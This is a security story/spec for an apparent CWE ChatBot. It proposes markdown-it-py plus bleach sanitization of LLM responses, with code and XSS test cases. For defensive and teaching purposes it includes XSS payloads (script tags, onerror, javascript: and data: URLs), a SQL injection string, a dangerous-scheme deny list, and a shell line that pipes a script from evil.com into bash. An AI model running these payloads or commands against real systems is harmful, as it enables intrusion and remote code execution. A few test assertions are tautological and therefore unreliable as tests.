# Story S-13: Implement Secure Markdown Sanitization for LLM Responses

- **Status:** Draft
- **Priority:** High
- **Story Type:** Security Enhancement
- **Related Stories:** S-2 (LLM Guardrails), S-12 (XSS Prevention)
- **CWE Coverage:** CWE-79 (XSS), CWE-116 (Improper Encoding/Escaping)
- **Security Impact:** Prevents XSS attacks in formatted LLM responses while preserving code examples

## Story

**As a** Security Engineer,
**I want** safe markdown rendering for LLM responses with preserved code examples,
**so that** users see properly formatted CWE explanations with code snippets while being protected from XSS attacks.

## Background

The CWE ChatBot currently uses aggressive HTML escaping for all LLM responses (`sanitize_markdown()` → `sanitize_html()`), which prevents XSS but also removes all markdown formatting. This creates a poor user experience for educational content that includes:

- **Bold/italic emphasis** for key concepts
- **Code blocks** showing vulnerable code patterns (essential for CWE education)
- **Links** to CWE definitions and remediation guides
- **Lists** for enumerating related CWEs or mitigation steps

**Current State:**
- File: `apps/chatbot/src/security/sanitization.py`
- Function: `sanitize_markdown()` (placeholder - calls `sanitize_html()`)
- Effect: All LLM responses are plain text with escaped HTML entities
- Model Armor: Already sanitizes prompts/responses for prompt injection (S-2)

**Desired State:**
- Preserve safe markdown formatting (bold, italic, code blocks, links, lists)
- Block all executable content (inline HTML, `javascript:` URLs, `data:` URLs)
- Display code examples as escaped text (not executed)
- Maintain defense-in-depth with Model Armor upstream

## Acceptance Criteria

### AC1: Safe Markdown Rendering with Allow-List Approach
- [ ] Implement markdown-to-HTML conversion with inline HTML **disabled**
- [ ] Use library with security track record: `markdown-it-py` (Python port of markdown-it)
- [ ] Configure CommonMark mode with `html=False` to prevent inline HTML rendering
- [ ] Allow-list safe HTML tags: `<p>`, `<br>`, `<strong>`, `<em>`, `<a>`, `<ul>`, `<ol>`, `<li>`, `<code>`, `<pre>`
- [ ] Block all other HTML tags and attributes

### AC2: URL Scheme Validation
- [ ] Allow only safe URL schemes in links: `http://`, `https://`, `mailto:`, `tel:`
- [ ] Block dangerous schemes: `javascript:`, `data:`, `vbscript:`, `file:`, `about:`
- [ ] Apply `rel="nofollow noopener noreferrer"` to all links automatically
- [ ] Test cases for javascript/data URL injection attempts

### AC3: Code Block Handling for Educational Content
- [ ] Preserve fenced code blocks (triple backticks) as `<pre><code>...</code></pre>`
- [ ] Preserve inline code (single backticks) as `<code>...</code>`
- [ ] **Critical:** Code content must be HTML-escaped (not executed)
- [ ] Honor `allow_code_blocks=False` parameter to strip code blocks when needed
- [ ] Test case: Code blocks containing `<script>`, `onerror=`, event handlers render as literal text

### AC4: Defense in Depth with Model Armor
- [ ] Document that `sanitize_markdown()` is the **last-mile defense** after Model Armor
- [ ] Model Armor sanitizes for prompt injection/unsafe content (upstream - S-2)
- [ ] Markdown sanitizer prevents XSS/HTML injection (downstream - this story)
- [ ] Both layers remain active and independent (fail-closed if either fails)

### AC5: Integration with Existing Code
- [ ] Update `sanitize_markdown()` in `apps/chatbot/src/security/sanitization.py`
- [ ] Maintain existing function signature: `def sanitize_markdown(text: str, allow_code_blocks: bool = True) -> str`
- [ ] **Breaking change:** Return value changes from escaped text to sanitized HTML
- [ ] Update all call sites to handle HTML output (currently only exported, not called)
- [ ] Add dependencies: `markdown-it-py`, `bleach` (or `nh3` for Rust-based alternative)

### AC6: Comprehensive Security Testing
- [ ] Unit tests for XSS payloads in markdown (inline HTML, event handlers, script tags)
- [ ] Unit tests for URL scheme bypasses (`javascript:`, `data:`, mixed case)
- [ ] Unit tests for code block sanitization (verify content is escaped, not executed)
- [ ] Unit tests for allow-list bypass attempts (unknown tags, attributes, protocols)
- [ ] Integration test: Send markdown response through full pipeline (Model Armor → sanitize_markdown → Chainlit)
- [ ] **Critical test:** Verify CWE code examples (with `<script>` content) display as text, not execute

## Security Requirements

### SR1: No Executable Content in Rendered Output
- Markdown parser must disable inline HTML (`html=False` in markdown-it-py)
- HTML sanitizer must strip/escape all non-allowed tags
- JavaScript execution must be impossible through any vector (tags, attributes, URLs, protocols)

### SR2: Preserve Educational Code Examples Safely
- Code blocks containing exploit examples (e.g., XSS payloads) must display literally
- Users must see `<script>alert('XSS')</script>` as text, not as a running script
- This is critical for CWE education - users need to see vulnerable code patterns

### SR3: Fail-Closed on Sanitization Errors
- If markdown parsing fails, fallback to `sanitize_html()` (aggressive escaping)
- If HTML sanitization fails, fallback to plain text
- Log sanitization failures with `get_secure_logger()` at ERROR severity
- Never display unsanitized content on error


## Technical Implementation Notes

### Recommended Approach: markdown-it-py + bleach

```python
import re
from markdown_it import MarkdownIt
import bleach

# Allow-list configuration
ALLOWED_TAGS = [
    "p", "br", "strong", "em", "a", "ul", "ol", "li", "code", "pre"
]
ALLOWED_ATTRS = {
    "a": ["href", "title", "rel"]
}
ALLOWED_SCHEMES = ["http", "https", "mailto", "tel"]

def sanitize_markdown(text: str, allow_code_blocks: bool = True) -> str:
    """
    Sanitize markdown while preserving safe formatting.
    Returns sanitized HTML safe for display.

    Defense-in-depth layers:
    1. Model Armor (upstream): Prompt injection, unsafe content filtering
    2. markdown-it-py: Markdown→HTML with inline HTML disabled
    3. Bleach: Allow-list HTML tags/attrs/schemes
    4. Link hardening: Force rel="nofollow noopener noreferrer"

    Args:
        text: Markdown text from LLM response
        allow_code_blocks: Whether to allow <pre><code> blocks (default True)

    Returns:
        Sanitized HTML safe for display in Chainlit
    """
    try:
        # 1. Optionally strip code blocks at markdown level
        md_input = text
        if not allow_code_blocks:
            md_input = _remove_code_blocks(md_input)

        # 2. Render Markdown→HTML with inline HTML disabled
        md = MarkdownIt("commonmark", {"html": False, "linkify": True})
        rendered_html = md.render(md_input)

        # 3. Choose allowed tags (toggle <pre> based on allow_code_blocks)
        allowed_tags = list(ALLOWED_TAGS)
        if allow_code_blocks:
            allowed_tags.append("pre")

        # 4. Sanitize HTML output (kills inline HTML, bad attrs, bad schemes)
        cleaned_html = bleach.clean(
            rendered_html,
            tags=allowed_tags,
            attributes=ALLOWED_ATTRS,
            protocols=ALLOWED_SCHEMES,
            strip=False  # Escape disallowed tags instead of removing
        )

        # 5. Enforce safe rel= on anchors
        cleaned_html = _force_safe_rel(cleaned_html)

        return cleaned_html

    except Exception as e:
        # Fail-closed: Fall back to aggressive HTML escaping
        logger = get_secure_logger(__name__)
        logger.error(f"Markdown sanitization failed: {e}", exc_info=True)
        return sanitize_html(text)
```

### Alternative: Use `nh3` Instead of `bleach`

`nh3` is a Rust-based HTML sanitizer (Python bindings) that's faster and memory-safe:
- Maintained by Thunderbird/Firefox developers
- 10-100x faster than bleach for large content
- Memory-safe (no buffer overflows)
- Same allow-list approach

**Recommendation:** Start with `bleach` (more documentation), consider `nh3` if performance is an issue.

### Integration Points

**Current usage of `sanitize_markdown()`:**
- Currently **only exported** from `src/security/__init__.py` but **not called** anywhere
- This is a **new feature** that requires integration into message rendering pipeline

**Where to integrate:**
1. `src/conversation.py` - Before sending LLM responses to `cl.Message()`
   - Line 349: `msg = cl.Message(content=result["response_text"])`
   - Line 375: `msg = cl.Message(content=pipeline_result.final_response_text)`
   - Line 382: `msg = cl.Message(content=pipeline_result.final_response_text)`

2. Consider creating a helper function:
```python
def send_safe_markdown_message(content: str, **kwargs) -> cl.Message:
    """Send Chainlit message with sanitized markdown."""
    safe_html = sanitize_markdown(content, allow_code_blocks=True)
    return cl.Message(content=safe_html, **kwargs)
```

## Tasks / Subtasks

### Task 1: Implement Core Markdown Sanitization
- [ ] Add dependencies to `pyproject.toml`: `markdown-it-py`, `bleach` (or `nh3`)
- [ ] Update `sanitize_markdown()` with markdown-it-py + bleach implementation
- [ ] Add helper function `_remove_code_blocks()` for `allow_code_blocks=False`
- [ ] Add helper function `_force_safe_rel()` for link hardening
- [ ] Add allow-list constants at module level
- [ ] Implement fail-closed error handling (fallback to `sanitize_html()`)

### Task 2: Security Testing
- [ ] Write unit test: XSS payloads in markdown (inline `<script>`, event handlers)
- [ ] Write unit test: URL scheme bypasses (`javascript:`, `data:`, `JAVASCRIPT:`, mixed case)
- [ ] Write unit test: Code block safety (verify `<script>` in code block is escaped)
- [ ] Write unit test: `allow_code_blocks=False` removes code blocks
- [ ] Write unit test: Allow-list bypass attempts (unknown tags, attributes)
- [ ] Write unit test: Fail-closed behavior (exception during sanitization)
- [ ] Write unit test: Link `rel=` attribute enforcement

### Task 3: Integration Testing
- [ ] Integration test: Full pipeline (user query → Model Armor → LLM → sanitize_markdown → Chainlit)
- [ ] Integration test: CWE-79 example code (XSS payload) displays as text
- [ ] Integration test: Markdown formatting preserved (bold, italic, lists, links, code)
- [ ] Integration test: Dangerous markdown blocked (inline HTML, javascript: URLs)
- [ ] Manual test: Query "Explain CWE-79 with code example" and verify rendered output

### Task 4: Update Call Sites (If Needed)
- [ ] Audit all `cl.Message(content=...)` call sites
- [ ] Determine which messages should use markdown sanitization vs HTML escaping
- [ ] **Decision point:** Update existing call sites or create new `send_safe_markdown_message()` helper?
- [ ] Update message rendering to handle HTML output from `sanitize_markdown()`

### Task 5: Documentation and Runbook
- [ ] Update function docstring with defense-in-depth explanation
- [ ] Add usage examples to docstring
- [ ] Create runbook entry for markdown sanitization monitoring/tuning
- [ ] Update security architecture diagram to show sanitization layers

## Test Cases (Critical for Security)

### XSS Prevention Tests
```python
def test_xss_inline_script_blocked():
    """Inline <script> tags must be escaped/stripped."""
    md = "Hello <script>alert('XSS')</script> world"
    result = sanitize_markdown(md)
    assert "<script>" not in result
    assert "alert" not in result or "&lt;script&gt;" in result

def test_xss_event_handler_blocked():
    """Event handlers in markdown must be neutralized."""
    md = '<img src=x onerror="alert(1)">'
    result = sanitize_markdown(md)
    assert "onerror" not in result or "&quot;" in result
    assert "alert" not in result or "alert" not in result.lower()

def test_javascript_url_blocked():
    """javascript: URLs must be stripped from links."""
    md = '[Click me](javascript:alert(1))'
    result = sanitize_markdown(md)
    assert "javascript:" not in result.lower()
```

### Code Block Safety Tests
```python
def test_code_block_escaped_not_executed():
    """Code blocks with <script> must display as text."""
    md = '```python\n<script>alert("XSS")</script>\n```'
    result = sanitize_markdown(md)
    assert "<pre>" in result or "<code>" in result
    assert "&lt;script&gt;" in result  # Escaped
    assert "<script>" not in result  # Not literal

def test_allow_code_blocks_false_removes_code():
    """allow_code_blocks=False must remove code blocks."""
    md = '```python\nprint("hello")\n```'
    result = sanitize_markdown(md, allow_code_blocks=False)
    assert "<pre>" not in result
    assert "<code>" not in result or "<code>" not in result  # Inline code OK
```

### URL Scheme Safety Tests
```python
def test_data_url_blocked():
    """data: URLs must be stripped."""
    md = '[Click](data:text/html,<script>alert(1)</script>)'
    result = sanitize_markdown(md)
    assert "data:" not in result

def test_safe_urls_allowed():
    """http/https/mailto URLs must be preserved."""
    md = '[Link](https://example.com) [Email](mailto:test@example.com)'
    result = sanitize_markdown(md)
    assert "https://example.com" in result
    assert "mailto:test@example.com" in result
```

## Dev Notes

### Implementation Approach: Return Sanitized HTML

**Decision:** Follow the markdown-it-py + bleach approach, returning sanitized HTML.

**Why This Works:**

Modern chat UIs (including Chainlit) typically support both markdown and HTML rendering. The safest approach is:
1. **Parse markdown to HTML** with inline HTML disabled (markdown-it-py with `html=False`)
2. **Sanitize the HTML** with strict allow-lists (bleach)
3. **Return sanitized HTML** to Chainlit

**Key Advantages:**
- **Industry standard:** GitHub, GitLab, Stack Overflow, Reddit all sanitize at HTML level
- **Defense-in-depth:** Two layers (markdown parser escapes + HTML sanitizer validates)
- **Code block safety:** Markdown parser automatically escapes code content
- **Single source of truth:** Parse once, sanitize once, no ambiguity

**How Code Examples Stay Safe:**

```python
# LLM returns markdown with dangerous code:
"""
Here's a CWE-79 example:
```javascript
<script>alert(document.cookie)</script>
```
"""

# Step 1: markdown-it-py converts to HTML (html=False means inline HTML is escaped)
"""
<p>Here's a CWE-79 example:</p>
<pre><code class="language-javascript">
&lt;script&gt;alert(document.cookie)&lt;/script&gt;
</code></pre>
"""

# Step 2: bleach validates (already safe, tags are in allow-list)
# Output: Safe HTML with escaped code

# User sees: <script>alert(document.cookie)</script>
# Browser does: Nothing (it's escaped HTML entities, not executable code)
```

**Implementation Path:**
- Use markdown-it-py for markdown → HTML conversion
- Use bleach for HTML allow-list sanitization
- Return sanitized HTML string
- Chainlit renders the HTML safely

### Why markdown-it-py Over Other Libraries?
- **Security track record:** Port of markdown-it (JavaScript), widely used and audited
- **Inline HTML disable:** Explicit `html=False` option to prevent inline HTML rendering
- **CommonMark compliance:** Follows standard spec, predictable behavior
- **Active maintenance:** Regular updates, security patches

**Alternatives considered:**
- `mistune` - Faster but less control over HTML sanitization
- `python-markdown` - More features but harder to disable inline HTML safely
- `commonmark.py` - Minimal, but lacks extensions we may need later

### Why bleach for HTML Sanitization?
- **Mozilla-maintained:** Used by Firefox, strong security reputation
- **Allow-list approach:** Explicit allow-lists are safer than deny-lists
- **Protocol filtering:** Built-in support for URL scheme filtering
- **Battle-tested:** Used in production by GitHub, Jupyter, and many others

**Alternative:** `nh3` (Rust-based) for better performance if needed.

### Model Armor Integration Notes
From S-2 story analysis:
- Model Armor **already sanitizes** prompts/responses for prompt injection, unsafe content
- Model Armor works on **prompt text**, not rendered HTML
- `sanitize_markdown()` is **complementary**, not redundant:
  - Model Armor: Stops prompt injection, jailbreaks, offensive content
  - Markdown sanitizer: Stops XSS, HTML injection in formatted responses
- Both layers are necessary for defense-in-depth

### LLM May Return Any Language in Code Blocks (Critical Security Note)

**Reality Check:** The LLM explaining CWE vulnerabilities will return code examples in **any language**:
- **HTML/JavaScript:** `<script>alert('XSS')</script>`, `<img onerror=alert(1)>`
- **SQL:** `'; DROP TABLE users; --`
- **Shell:** `$(curl evil.com/shell.sh | bash)`
- **CSS:** `<style>body { display: none; }</style>`
- **XML/SVG:** `<svg onload=alert(1)>`

**How This Solution Handles It (Safe by Design):**

1. **markdown-it-py with `html=False`:**
   - All inline HTML in markdown is **rendered as escaped text**, not as HTML
   - Example: LLM returns `` `<script>alert(1)</script>` `` → markdown-it converts to `<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>`
   - The markdown parser **never** interprets HTML tags as actual HTML

2. **Code blocks are pre-escaped by markdown-it:**
   - Triple backticks: ` ```html\n<script>...</script>\n``` ` → `<pre><code>&lt;script&gt;...&lt;/script&gt;</code></pre>`
   - The markdown renderer escapes content **before** it reaches bleach
   - Bleach sees already-safe HTML entities, not raw tags

3. **Bleach sanitization is defense-in-depth:**
   - Even if markdown-it somehow failed to escape, bleach would strip/escape disallowed tags
   - Two-layer protection: markdown-it escapes → bleach validates

**Why This Is Safe for CWE Education:**

```python
# LLM returns this markdown:
"""
CWE-79 (XSS) vulnerable code:
```html
<input type="text" value="<?php echo $_GET['name']; ?>">
<script>alert(document.cookie)</script>
```
"""

# After sanitize_markdown():
"""
<p>CWE-79 (XSS) vulnerable code:</p>
<pre><code class="language-html">
&lt;input type="text" value="&lt;?php echo $_GET['name']; ?&gt;"&gt;
&lt;script&gt;alert(document.cookie)&lt;/script&gt;
</code></pre>
"""

# User sees (literally, as text):
# <input type="text" value="<?php echo $_GET['name']; ?>">
# <script>alert(document.cookie)</script>

# Browser does NOT execute the <script> tag - it's escaped HTML entities
```

**The Key Insight:**
- markdown-it with `html=False` treats **all raw HTML as text** (not HTML)
- Code blocks are **double-escaped** by design (markdown syntax + HTML entities)
- The only HTML that survives is markdown-generated structure (`<p>`, `<code>`, `<pre>`)
- User-controlled content (LLM output) is always escaped at the markdown parsing stage

**This is EXACTLY what we want for security education:**
- Students see literal exploit code as text
- Browser never executes anything
- Code examples are copy-pasteable for learning
- Zero XSS risk even if LLM generates malicious code

### Breaking Change Notice
**Current behavior:** `sanitize_markdown()` returns HTML-escaped text
**New behavior:** `sanitize_markdown()` returns sanitized HTML

**Impact:** Currently not called anywhere, so no breaking change in practice. Future call sites must expect HTML output.

## Related Documentation

- [S-2: LLM I/O Guardrails](./S-2.LLM-Input-Output-Guardrails.md) - Model Armor integration
- [S-12: CSRF and WebSocket Security](./S-12.CSRF-and-WebSocket-Security-Hardening.md) - Related security hardening
- [apps/chatbot/src/security/sanitization.py](../../apps/chatbot/src/security/sanitization.py) - Current implementation
- [CWE-79: Cross-site Scripting](https://cwe.mitre.org/data/definitions/79.html) - Primary vulnerability prevented
- [CWE-116: Improper Encoding or Escaping of Output](https://cwe.mitre.org/data/definitions/116.html) - Related weakness

## Security Review Checklist

Before marking this story complete:
- [ ] All XSS test cases pass (inline scripts, event handlers, javascript: URLs)
- [ ] Code blocks containing exploit examples display as text (not executed)
- [ ] Allow-list bypass attempts fail (unknown tags, attributes, schemes)
- [ ] Fail-closed behavior verified (sanitization errors return safe content)
- [ ] Integration test with full pipeline passes (Model Armor → sanitize_markdown → Chainlit)
- [ ] Manual verification: CWE explanation with code example renders correctly
- [ ] No CSP violations in rendered output
- [ ] Security documentation updated (defense-in-depth architecture)

---

## Dev Agent Record

### Agent Model Used
- Model: (To be filled during implementation)

### Debug Log References
- (To be filled during implementation)

### Completion Notes
- (To be filled during implementation)

### File List
- (To be filled during implementation)

### Change Log
- 2025-10-26: Story created by James (dev agent) based on user request
